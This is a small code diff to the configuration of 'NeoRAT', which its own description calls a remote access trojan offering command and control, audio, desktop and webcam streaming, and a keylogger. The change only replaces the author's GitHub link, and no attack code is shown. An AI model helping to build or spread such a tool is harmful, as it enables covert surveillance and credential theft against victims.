@@ -6,7 +6,7 @@ state = {
   'description': 'NeoRAT (2/3) hosts a TCP server allowing connections from clients.\n'
                + 'Supporting C2C with powerful features, including streams of audio, \n'
                + 'desktop, webcam & keylogger, while improving upon NexRAT. [USE: \'HELP\']',
-  'author': 'Author\'s Github: https://github.com/Alvin-22',
+  'author': 'Author\'s Github: https://github.com/Wans1e',
   'settings': {
     'dynamic': {
       'is-loading': False,
